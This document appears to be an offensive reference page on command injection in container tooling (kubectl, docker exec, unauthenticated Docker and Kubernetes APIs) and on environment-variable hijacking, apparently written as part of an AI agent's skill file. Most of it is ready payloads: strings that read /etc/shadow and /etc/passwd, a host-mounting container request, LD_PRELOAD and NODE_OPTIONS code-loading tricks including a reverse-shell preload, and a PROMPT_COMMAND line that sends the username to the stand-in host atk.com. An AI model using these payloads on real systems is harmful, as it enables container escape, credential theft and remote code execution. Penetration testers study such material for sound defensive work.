# cmdi-command-injection technical reference

For other original section numbers, use the [entry index](../SKILL.md#references).

## 13. CONTAINER / K8S EXEC INJECTION

### kubectl exec injection

When a web application constructs `kubectl exec` commands with user input:

```text
# Vulnerable pattern
kubectl exec $POD_NAME -- /bin/sh -c "echo $USER_INPUT"

# Injection via pod name
POD_NAME="mypod -- /bin/sh -c whoami #"
→ kubectl exec mypod -- /bin/sh -c whoami # -- /bin/sh -c "echo ..."

# Injection via user input in command
USER_INPUT='"; cat /etc/passwd; echo "'
→ kubectl exec pod -- /bin/sh -c "echo ""; cat /etc/passwd; echo """
```

### Docker exec injection

```text
# Vulnerable web admin panel
docker exec $CONTAINER_NAME $COMMAND

# Injection via container name
CONTAINER_NAME="web_app -u root web_app"
→ docker exec web_app -u root web_app $COMMAND  (runs as root)

# Injection via command argument
COMMAND="status; cat /etc/shadow"
→ docker exec container /bin/sh -c "status; cat /etc/shadow"
```

### Container runtime API (unauthenticated)

```text
# Docker socket exposed (2375/2376 or /var/run/docker.sock)
POST /containers/create HTTP/1.1
{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow"],"Binds":["/:/host"]}

# Then start + exec
POST /containers/{id}/start
POST /containers/{id}/exec {"Cmd":["cat","/host/etc/shadow"]}

# Kubernetes API (6443/8443 unauthenticated)
POST /api/v1/namespaces/default/pods/{name}/exec?command=whoami&stdout=true
```

### Sinks to watch for

| Component | Injection Vector |
|-----------|-----------------|
| CI/CD pipeline (Jenkins, GitLab CI) | Build step parameters, environment variables |
| Kubernetes CronJob | `.spec.containers[].command` from user-defined schedules |
| Helm chart values | `values.yaml` templated into pod specs with `{{ }}` |
| Container orchestration UI | "Run command" features in Portainer, Rancher, etc. |

---

## 14. ENVIRONMENT VARIABLE INJECTION

When an application allows setting or influencing environment variables, several variables have **implicit execution** semantics:

### Linux / Unix

| Variable | Effect | Exploitation |
|----------|--------|-------------|
| `LD_PRELOAD` | Loaded before any shared library; constructor runs on process start | `putenv("LD_PRELOAD=/tmp/evil.so"); mail("a@b","","");` |
| `LD_LIBRARY_PATH` | Overrides library search path | Place malicious `libc.so.6` in controlled directory |
| `BASH_ENV` | Executed when non-interactive bash starts | `BASH_ENV=/tmp/evil.sh` → any `system()` / `popen()` call sources it |
| `ENV` | Same as BASH_ENV for POSIX `sh` | `ENV=/tmp/evil.sh` |
| `PROMPT_COMMAND` | Executed before each interactive prompt | `PROMPT_COMMAND="curl http://atk.com/$(whoami)"` |
| `PS1` | Prompt string, supports `$()` expansion in bash | `PS1='$(cat /etc/passwd > /tmp/out) \$ '` |
| `PYTHONSTARTUP` | Python script executed on interpreter startup | Inject path to malicious `.py` file |
| `PERL5OPT` | Options passed to every Perl invocation | `PERL5OPT='-Mbase;system("id")'` |
| `NODE_OPTIONS` | Options passed to every Node.js invocation | `NODE_OPTIONS='--require /tmp/evil.js'` |
| `RUBYOPT` | Options for Ruby | `RUBYOPT='-r/tmp/evil.rb'` |

### Windows

| Variable | Effect |
|----------|--------|
| `COMSPEC` | Path to command interpreter; `system()` calls use this | Set to malicious executable |
| `PATH` | Command resolution order; place malicious binary earlier in path | DLL/EXE search order hijacking |
| `PSModulePath` | PowerShell auto-loads modules from these paths | Plant malicious module |

### Attack scenarios

**PHP `putenv()` + `mail()`**:
```php
// When putenv() is not disabled and mail() is available:
putenv("LD_PRELOAD=/tmp/evil.so");
mail("a@b.com","","","");
// mail() invokes sendmail → loads evil.so → constructor executes arbitrary code
```

**Git hook injection via environment**:
```bash
# GIT_DIR / GIT_WORK_TREE manipulation
GIT_DIR=/tmp/evil_repo/.git git status
# If hooks exist in the controlled repo, they execute
```

**Node.js `--require` injection**:
```bash
NODE_OPTIONS="--require=/tmp/reverse_shell.js" node /app/server.js
# reverse_shell.js is loaded before server.js
```
